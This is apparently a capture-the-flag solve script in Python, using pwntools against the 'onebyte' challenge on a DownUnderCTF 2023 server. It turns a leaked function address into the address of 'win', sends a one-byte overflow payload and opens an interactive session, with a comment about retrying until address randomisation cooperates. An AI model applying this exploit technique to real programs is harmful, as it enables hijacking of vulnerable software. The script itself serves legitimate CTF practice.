#!/usr/bin/env python3

from pwn import *

exe = ELF("./onebyte")

context.binary = exe
context.log_level = "DEBUG"

def conn():
	if False:
		r = process([exe.path])
	else:
		r = remote("2023.ductf.dev", 30018)

	return r


def main():
	r = conn()
	#gdb.attach(r, '''b *main+93''')
	init_leak = int(r.recvline()[11:].decode(),16)
	win = p32(init_leak - exe.sym['init'] + exe.sym['win'])
	r.sendafter(b"turn:", win*4 + b"\x70")
	r.interactive()


if __name__ == "__main__":
	main()

# Kept attempting runs through failure because of PIE randomizing addresses/offsets, ran with this bash for-loop: while true; do ./solve.py; done
